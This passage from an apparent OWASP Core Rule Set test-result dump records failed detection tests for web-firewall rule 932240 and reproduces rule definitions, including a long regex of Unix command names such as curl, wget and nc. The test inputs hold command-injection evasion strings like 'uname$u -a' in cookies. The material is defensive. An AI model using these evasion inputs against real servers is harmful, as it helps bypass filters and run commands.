$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:7z(?:[\\s\\x0b&\\),<>\\|]|$|[arx](?:[\\s\\x0b&\\),<>\\|]|$))|a(?:a-[^\\s\\x0b]{1,10}\\b|(?:b|w[ks]|l(?:ias|pine)|tobm|xel)(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:t(?:[\\s\\x0b&\\),<>\\|]|$|-get)|parmor_[^\\s\\x0b]{1,10}\\b)|r(?:[\\s\\x0b&\\),<>\\|]|$|j(?:[\\s\\x0b&\\),<>\\|]|$|-register|disp)|(?:p|ch)(?:[\\s\\x0b&\\),<>\\|]|$)|ia2c)|s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|cii(?:-xfr|85)|pell)|dd(?:group|user)|getty|nsible|u(?:ditctl|repot|search))|b(?:z(?:(?:z|c(?:at|mp))(?:[\\s\\x0b&\\),<>\\|]|$)|diff|e(?:grep|xe(?:[\\s\\x0b&\\),<>\\|]|$))|f?grep|ip2(?:[\\s\\x0b&\\),<>\\|]|$|recover)|less|more)|a(?:s(?:e(?:32|64|n(?:ame(?:[\\s\\x0b&\\),<>\\|]|$)|c))|h(?:[\\s\\x0b&\\),<>\\|]|$))|tch(?:[\\s\\x0b&\\),<>\\|]|$))|lkid(?:[\\s\\x0b&\\),<>\\|]|$)|pftrace|r(?:eaksw|(?:idge|wap)(?:[\\s\\x0b&\\),<>\\|]|$))|sd(?:cat|iff|tar)|u(?:iltin|n(?:dler(?:[\\s\\x0b&\\),<>\\|]|$)|zip2)|s(?:ctl|ybox))|y(?:ebug|obu(?:[\\s\\x0b&\\),<>\\|]|$)))|c(?:[89]9(?:[\\s\\x0b&\\),<>\\|]|$|-gcc)|(?:a(?:t|ncel|psh)|c|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|p(?:[\\s\\x0b&\\),<>\\|]|$|(?:an|io)(?:[\\s\\x0b&\\),<>\\|]|$)|ulimit)|s(?:(?:h|cli)(?:[\\s\\x0b&\\),<>\\|]|$)|plit|vtool)|u(?:(?:t|rl)(?:[\\s\\x0b&\\),<>\\|]|$)|psfilter)|ertbot|h(?:(?:(?:att|di)r|mod|o(?:om|wn)|root|sh)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ck_(?:by_ssh|cups|log|memory|raid|s(?:sl_cert|tatusfile))|f(?:[\\s\\x0b&\\),\\-<>\\|]|$))|(?:flag|pas)s|g(?:passwd|rp(?:[\\s\\x0b&\\),<>\\|]|$)))|lang(?:\\+\\+|[\\s\\x0b&\\),<>\\|]|$)|o(?:bc(?:[\\s\\x0b&\\),<>\\|]|$|run)|lumn(?:[\\s\\x0b&\\),<>\\|]|$)|m(?:m(?:[\\s\\x0b&\\),<>\\|]|$|and(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:oser|ress)(?:[\\s\\x0b&\\),<>\\|]|$))|proc|w(?:say|think))|r(?:ash(?:[\\s\\x0b&\\),<>\\|]|$)|ontab))|d(?:(?:[dfu]|i(?:(?:alo)?g|ff)|ash|vips)(?:[\\s\\x0b&\\),<>\\|]|$)|hclient|m(?:esg(?:[\\s\\x0b&\\),<>\\|]|$)|idecode|setup)|o(?:(?:as|ne)(?:[\\s\\x0b&\\),<>\\|]|$)|cker(?:[\\s\\x0b&\\),\\-<>\\|]|$)|sbox)|pkg(?:[\\s\\x0b&\\),\\-<>\\|]|$))|e(?:(?:b|qn|cho|fax|grep|macs|val)(?:[\\s\\x0b&\\),<>\\|]|$)|n(?:v(?:[\\s\\x0b&\\),<>\\|]|$|-update)|d(?:if|sw)(?:[\\s\\x0b&\\),<>\\|]|$))|s(?:[\\s\\x0b&\\),<>\\|]|$|(?:h|ac)(?:[\\s\\x0b&\\),<>\\|]|$))|x(?:[\\s\\x0b&\\),<>\\|]|$|(?:ec|p(?:and|(?:ec|or)t|r))(?:[\\s\\x0b&\\),<>\\|]|$)|iftool)|2fsck|asy_install)|f(?:(?:c|mt|etch|lock|unction)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:[\\s\\x0b&\\),<>\\|]|$|(?:find|isk)(?:[\\s\\x0b&\\),<>\\|]|$)|u?mount)|g(?:[\\s\\x0b&\\),<>\\|]|$|rep(?:[\\s\\x0b&\\),<>\\|]|$))|i(?:[\\s\\x0b&\\),<>\\|]|$|letest|(?:n(?:d|ger)|sh)(?:[\\s\\x0b&\\),<>\\|]|$))|tp(?:[\\s\\x0b&\\),<>\\|]|$|stats|who)|acter|o(?:ld(?:[\\s\\x0b&\\),<>\\|]|$)|reach)|ping(?:[\\s\\x0b&\\),6<>\\|]|$))|g(?:c(?:c[^\\s\\x0b]{1,10}\\b|ore(?:[\\s\\x0b&\\),<>\\|]|$))|(?:db|i(?:t|mp|nsh)|o|pg|awk|z(?:cat|exe|ip))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:m(?:[\\s\\x0b&\\),<>\\|]|$)|ni(?:e(?:[\\s\\x0b&\\),<>\\|]|$)|soimage)|t(?:cap|facl(?:[\\s\\x0b&\\),<>\\|]|$)))|hc(?:[\\s\\x0b&\\),<>\\|]|$|-(?:[\\s\\x0b&\\),<>\\|]|$)|i(?:[\\s\\x0b&\\),\\-<>\\|]|$))|r(?:c(?:[\\s\\x0b&\\),<>\\|]|$|at(?:[\\s\\x0b&\\),<>\\|]|$))|ep(?:[\\s\\x0b&\\),<>\\|]|$)|oup(?:[\\s\\x0b&\\),<>\\|]|$|mod))|tester|unzip)|h(?:(?:d|up|i(?:ghlight|story))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:ad(?:[\\s\\x0b&\\),<>\\|]|$)|xdump)|ost(?:id|name)|ping3|t(?:digest|op(?:[\\s\\x0b&\\),<>\\|]|$)|passwd))|i(?:p(?:[\\s\\x0b&\\),<>\\|]|$|6?tables|config|p(?:eveprinter|find|tool))|(?:rb|conv)(?:[\\s\\x0b&\\),<>\\|]|$)|f(?:config|top(?:[\\s\\x0b&\\),<>\\|]|$))|onice|spell)|j(?:(?:js|q|exec)(?:[\\s\\x0b&\\),<>\\|]|$)|o(?:(?:bs|in)(?:[\\s\\x0b&\\),<>\\|]|$)|urnalctl)|runscript)|k(?:s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|shell)|ill(?:[\\s\\x0b&\\),<>\\|]|$|all)|nife(?:[\\s\\x0b&\\),<>\\|]|$))|l(?:d(?:[\\s\\x0b&\\),<>\\|]|$|d(?:[\\s\\x0b&\\),<>\\|]|$)|config)|(?:[np]|inks|ynx)(?:[\\s\\x0b&\\),<>\\|]|$)|s(?:[\\s\\x0b&\\),<>\\|]|$|(?:-F|cpu|hw|mod|of|pci|usb)(?:[\\s\\x0b&\\),<>\\|]|$)|b_release)|ua(?:[\\s\\x0b&\\),<>\\|]|$|(?:la)?tex)|z(?:4(?:[\\s\\x0b&\\),<>\\|]|$|c(?:[\\s\\x0b&\\),<>\\|]|$|at))|(?:c(?:at|mp))?(?:[\\s\\x0b&\\),<>\\|]|$)|diff|[ef]?grep|less|m(?:a(?:[\\s\\x0b&\\),<>\\|]|$|dec|info)|ore))|a(?:st(?:[\\s\\x0b&\\),<>\\|]|$|comm(?:[\\s\\x0b&\\),<>\\|]|$)|log(?:in)?)|tex(?:[\\s\\x0b&\\),<>\\|]|$))|ess(?:[\\s\\x0b&\\),<>\\|]|$|echo|(?:fil|pip)e)|ftp(?:[\\s\\x0b&\\),<>\\|]|$|get)|o(?:(?:ca(?:l|te)|ok)(?:[\\s\\x0b&\\),<>\\|]|$)|g(?:inctl|(?:nam|sav)e)|setup)|trace|wp-(?:d(?:ownload|ump)|mirror|request))|m(?:a(?:(?:n|il[qx]|ke|wk)(?:[\\s\\x0b&\\),<>\\|]|$)|ster\\.passwd)|(?:tr|v|utt)(?:[\\s\\x0b&\\),<>\\|]|$)|k(?:(?:dir|nod)(?:[\\s\\x0b&\\),<>\\|]|$)|fifo|temp)|locate|o(?:squitto|unt(?:[\\s\\x0b&\\),<>\\|]|$))|sg(?:attrib|c(?:at|onv)|filter|merge|uniq)|ysql(?:[\\s\\x0b&\\),<>\\|]|$|admin|dump(?:slow)?|hotcopy|show))|n(?:c(?:[\\s\\x0b&\\),<>\\|]|$|\\.(?:openbsd|traditional)|at(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:t(?:[\\s\\x0b&\\),<>\\|]|$|(?:c|st)at|kit-ftp|plan)|ofetch)|(?:l|p(?:m|ing)|a(?:no|sm|wk)|ice|o(?:de|hup)|roff)(?:[\\s\\x0b&\\),<>\\|]|$)|m(?:[\\s\\x0b&\\),<>\\|]|$|ap(?:[\\s\\x0b&\\),<>\\|]|$))|s(?:enter|lookup|tat(?:[\\s\\x0b&\\),<>\\|]|$)))|o(?:(?:d|ctave)(?:[\\s\\x0b&\\),<>\\|]|$)|nintr|p(?:en(?:ssl|v(?:pn|t))|kg(?:[\\s\\x0b&\\),<>\\|]|$)))|p(?:a(?:(?:x|rted|tch)(?:[\\s\\x0b&\\),<>\\|]|$)|s(?:swd|te(?:[\\s\\x0b&\\),<>\\|]|$)))|d(?:b(?:[\\s\\x0b&\\),<>\\|]|$|2mb|3(?:[\\s\\x0b&\\),\\.<>\\|]|$))|f(?:la)?tex|ksh(?:[\\s\\x0b&\\),<>\\|]|$))|f(?:[\\s\\x0b&\\),<>\\|]|$|tp(?:[\\s\\x0b&\\),<>\\|]|$))|i(?:c(?:[\\s\\x0b&\\),<>\\|]|$|o(?:[\\s\\x0b&\\),<>\\|]|$))|p(?:[^\\s\\x0b]{1,10}\\b|[\\s\\x0b&\\),<>\\|]|$)|dstat|(?:gz|ng6?)(?:[\\s\\x0b&\\),<>\\|]|$))|k(?:g(?:[\\s\\x0b&\\),<>\\|]|$|_?info)|exec|ill(?:[\\s\\x0b&\\),<>\\|]|$))|r(?:[\\s\\x0b&\\),<>\\|]|$|y(?:[\\s\\x0b&\\),<>\\|]|$)|int(?:env|f(?:[\\s\\x0b&\\),<>\\|]|$)))|t(?:x(?:[\\s\\x0b&\\),<>\\|]|$)|ar(?:[\\s\\x0b&\\),<>\\|]|$|diff|grep))|wd(?:[\\s\\x0b&\\),<>\\|]|$|\\.db)|(?:xz|grep|opd|u(?:ppet|shd))(?:[\\s\\x0b&\\),<>\\|]|$)|er(?:(?:f|ms)(?:[\\s\\x0b&\\),<>\\|]|$)|l(?:5?(?:[\\s\\x0b&\\),<>\\|]|$)|sh))|hp(?:-cgi|[57](?:[\\s\\x0b&\\),<>\\|]|$))|s(?:(?:ed|ql)(?:[\\s\\x0b&\\),<>\\|]|$)|ftp)|y(?:3?versions|thon(?:[23]|[^\\s\\x0b]{1,10}\\b)))|r(?:(?:a(?:r|k[eu])|bash|nano|oute|vi(?:ew|m))(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:[\\s\\x0b&\\),<>\\|]|$|p(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:d(?:[\\s\\x0b&\\),<>\\|]|$|carpet(?:[\\s\\x0b&\\),<>\\|]|$))|(?:v|boot|place)(?:[\\s\\x0b&\\),<>\\|]|$)|a(?:delf|lpath)|stic)|m(?:[\\s\\x0b&\\),<>\\|]|$|t(?:[\\s\\x0b&\\),<>\\|]|$|-(?:dump|tar))|dir(?:[\\s\\x0b&\\),<>\\|]|$)|user)|pm(?:[\\s\\x0b&\\),<>\\|]|$|db(?:[\\s\\x0b&\\),<>\\|]|$)|(?:quer|verif)y)|l(?:ogin|wrap)|sync(?:-ssl|[\\s\\x0b&\\),<>\\|]|$)|u(?:by[^\\s\\x0b]{1,10}\\b|n(?:-(?:mailcap|parts)|c(?:[\\s\\x0b&\\),<>\\|]|$))))|s(?:(?:c(?:p|hed|ript)|g|ash|diff|(?:ft|na)p|l(?:eep|sh))(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:(?:d|ndmail|rvice)(?:[\\s\\x0b&\\),<>\\|]|$)|t(?:[\\s\\x0b&\\),<>\\|]|$|arch|cap|env|facl(?:[\\s\\x0b&\\),<>\\|]|$)|sid))|h(?:[\\s\\x0b&\\),<>\\|]|$|\\.distrib|(?:adow|ells|u(?:f|tdown))(?:[\\s\\x0b&\\),<>\\|]|$))|sh(?:[\\s\\x0b&\\),<>\\|]|$|-(?:a(?:dd|gent)|copy-id|key(?:ge|sca)n)|pass)|u(?:[\\s\\x0b&\\),<>\\|]|$|do(?:-rs|[\\s\\x0b&\\),<>_\\|]|$|edit|replay))|vn(?:[\\s\\x0b&\\),<>\\|]|$|a(?:dmin|uthz)|bench|dumpfilter|fsfs|look|mucc|rdump|s(?:erve|ync)|version)|mbclient|o(?:cat(?:[\\s\\x0b&\\),<>\\|]|$)|elim)|p(?:lit(?:[\\s\\x0b&\\),<>\\|]|$)|wd\\.db)|qlite3|t(?:art-stop-daemon|d(?:buf|err|in(?:[\\s\\x0b&\\),<>\\|]|$)|out)|r(?:ace|ings(?:[\\s\\x0b&\\),<>\\|]|$)))|ys(?:ctl|tem(?:ctl|d-resolve)))|t(?:a(?:[cr](?:[\\s\\x0b&\\),<>\\|]|$)|il(?:[\\s\\x0b&\\),<>\\|]|$|f(?:[\\s\\x0b&\\),<>\\|]|$))|skset)|(?:bl|o(?:p|uch)|ftp|mux)(?:[\\s\\x0b&\\),<>\\|]|$)|c(?:p(?:[\\s\\x0b&\\),<>\\|]|$|dump|ing|traceroute)|l?sh(?:[\\s\\x0b&\\),<>\\|]|$))|e(?:[ex](?:[\\s\\x0b&\\),<>\\|]|$)|lnet)|i(?:c(?:[\\s\\x0b&\\),<>\\|]|$)|medatectl)|r(?:aceroute6?|off(?:[\\s\\x0b&\\),<>\\|]|$))|shark)|u(?:dp(?:[\\s\\x0b&\\),<>\\|]|$)|l(?:[\\s\\x0b&\\),<>\\|]|$|imit(?:[\\s\\x0b&\\),<>\\|]|$))|n(?:(?:compress|iq|rar|s(?:et|hare)|xz)(?:[\\s\\x0b&\\),<>\\|]|$)|expand|l(?:ink(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:4(?:[\\s\\x0b&\\),<>\\|]|$)|ma))|pigz|z(?:ip(?:[\\s\\x0b&\\),<>\\|]|$)|std))|pdate-alternatives|ser(?:(?:ad|mo)d|del)|u(?:de|en)code)|v(?:i(?:m(?:[\\s\\x0b&\\),<>\\|]|$|diff)|(?:gr|pw|rsh)(?:[\\s\\x0b&\\),<>\\|]|$)|sudo(?:-rs)?)|algrind|olatility(?:[\\s\\x0b&\\),<>\\|]|$))|w(?:(?:3m|c|atch|get)(?:[\\s\\x0b&\\),<>\\|]|$)|h(?:iptail(?:[\\s\\x0b&\\),<>\\|]|$)|oami)|i(?:reshark|sh(?:[\\s\\x0b&\\),<>\\|]|$)))|x(?:(?:(?:x|pa)d|args|term)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:[\\s\\x0b&\\),<>\\|]|$|c(?:at|mp)(?:[\\s\\x0b&\\),<>\\|]|$)|d(?:ec(?:[\\s\\x0b&\\),<>\\|]|$)|iff)|[ef]?grep|less|more)|e(?:latex|tex(?:[\\s\\x0b&\\),<>\\|]|$))|mo(?:dmap|re(?:[\\s\\x0b&\\),<>\\|]|$)))|y(?:um|arn|elp)(?:[\\s\\x0b&\\),<>\\|]|$)|z(?:ip(?:[\\s\\x0b&\\),<>\\|]|$|c(?:loak|mp)|details|grep|info|(?:merg|not)e|split|tool)|s(?:h(?:[\\s\\x0b&\\),<>\\|]|$)|oelim|td(?:[\\s\\x0b&\\),<>\\|]|$|(?:ca|m)t|grep|less))|athura|(?:c(?:at|mp)|diff|grep|less|run)(?:[\\s\\x0b&\\),<>\\|]|$)|e(?:grep|ro(?:[\\s\\x0b&\\),<>\\|]|$))|fgrep|mo(?:dload|re(?:[\\s\\x0b&\\),<>\\|]|$))|ypper))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932236
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (command without evasion)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 3,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "globbing technique 3: una$$me -a in cookies (BB S01X1GRV)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "globbing technique 3: una$$me -a in cookies (BB S01X1GRV)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Cookie" : "una$$me -a"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932240.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932240"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)[\\-0-9_a-z]+(?:[\\s\\x0b]*[\\\"'][^\\s\\x0b\\\"',:]+[\\\"']|(?:[\\\"'][\\\"']+|[\\[-\\]]+|\\$+[!#\\*\\-0-9\\?@\\x5c_a-\\{]+|``|[\\$<>]\\(\\))[\\s\\x0b]*)[\\-0-9_a-z]+"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932240
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection evasion attempt detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{TX.932240_MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.932240_matched_var_name=%{matched_var_name}"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "932240",
    "test_id" : 4,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932240.yaml",
    "description" : "globbing technique 4: uname$u -a (BB S01X1GRV)",
    "cause" : "failed expect_id check: 932240 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "globbing technique 4: uname$u -a (BB S01X1GRV)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Cookie" : "uname$u -a"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932240 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932240,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " -=[ Rule 932240 ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic RCE Bypass blocking using different techniques: see https://github.com/coreruleset/coreruleset/issues/2632"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule complements rule 932230 with generic evasion detection."
        }, {
          "type" : "Comment",
          "text" : " Anything that uses a well-known evasion technique should be blocked at this level."
        }, {
          "type" : "Comment",
          "text" : " The chained rule will exclude false positives due to german thousands separators (e.g., 10'000)."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
